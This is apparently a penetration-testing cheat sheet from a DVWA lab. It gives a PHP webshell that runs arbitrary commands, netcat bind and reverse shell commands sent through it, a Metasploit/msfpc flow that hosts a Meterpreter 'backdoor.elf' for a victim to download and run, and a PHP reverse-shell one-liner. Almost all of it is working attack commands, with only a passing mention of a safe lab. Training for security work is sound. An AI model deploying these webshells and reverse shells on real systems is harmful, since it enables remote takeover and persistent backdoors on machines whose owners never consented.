# Shells

## Webshell (PHP)
```php
<?php
echo shell_exec($_GET['cmd'] . ' 2>&1');
?>
```
**Example:**  
`http://192.168.100.3/dvwa/hackable/uploads/shell.php?cmd=ls`  
Try `cmd=nc -h` to check whether `-e` option is available.

## Bind Shell
`http://192.168.100.3/dvwa/hackable/uploads/shell.php?cmd=nc -e /bin/bash -lp 1234`  
`nmap -p 1234 192.168.100.3`  
`nc 192.168.100.3 1234`

## Reverse Shell
`http://192.168.100.3/dvwa/hackable/uploads/shell.php?cmd=nc -e /bin/bash 192.168.100.2 1234`  
`nmap -p 1234 192.168.100.2`  
`nc -vv -lp 1234`

## Meterpreter / Payload flow
```
msfpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
```
**Example:**
```
msfpc Linux 192.168.100.2 5678 MSF REVERSE TCP
msfconsole -q -r '/home/kali/Downloads/linux-meterpreter-staged-reverse-tcp-5678-elf.rc'
cp linux-meterpreter-staged-reverse-tcp-5678.elf /var/www/html/backdoor.elf
# On victim:
192.168.100.2 && wget http://192.168.100.2/backdoor.elf
192.168.100.2 && chmod +x backdoor.elf
192.168.100.2 && ./backdoor.elf
```

## Meterpreter session commands
- `sessions -i`  
- `sessions -i 1`  
- `sysinfo`  
- `getuid`  
- `shell`  (to get a native Linux shell)

## If the shell is not interactive
```bash
php -r '$sock=fsockopen("192.168.100.2",4321);exec("/bin/bash -i <&3 >&3 2>&3");'
nc -vv -lp 4321   # Catch the shell - Interactive
```

## Shells : Bad Guys Perspective
Search for `php webshells` (test and upload in a safe lab environment).  
Example webshell to try: `Predator.php` (upload and browse).
